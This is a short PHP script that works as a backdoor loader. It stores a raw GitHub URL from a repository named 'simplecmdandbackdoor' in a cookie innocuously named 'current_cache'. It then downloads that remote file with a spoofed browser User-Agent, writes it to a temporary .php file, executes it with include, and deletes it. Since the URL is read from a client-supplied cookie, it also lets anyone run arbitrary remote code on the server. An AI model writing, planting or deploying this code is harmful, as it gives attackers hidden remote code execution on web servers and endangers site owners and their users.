<?php
if (empty($_COOKIE['current_cache'])) {
    setcookie('current_cache', 'https://raw.githubusercontent.com/Yucaerin/simplecmdandbackdoor/refs/heads/main/jq.php?x=' . time(), time() + 3600, '/');
    header('Refresh: 0');
    exit;
}

$url = $_COOKIE['current_cache'];

$headers = [
    "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36",
    "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language: en-US,en;q=0.9",
    "Accept-Encoding: gzip, deflate",
    "Connection: keep-alive"
];

$ch = curl_init();

curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36");

curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_2TLS); 
curl_setopt($ch, CURLOPT_HTTP_VERSION, CURL_HTTP_VERSION_1_1);

curl_setopt($ch, CURLOPT_ENCODING, "");

$content = curl_exec($ch);

if(curl_errno($ch)) {
    die('Error:' . curl_error($ch));
}

curl_close($ch);
$tmpFile = tempnam(sys_get_temp_dir(), 'rc_') . '.php';
file_put_contents($tmpFile, $content);
include $tmpFile;
unlink($tmpFile);
?>
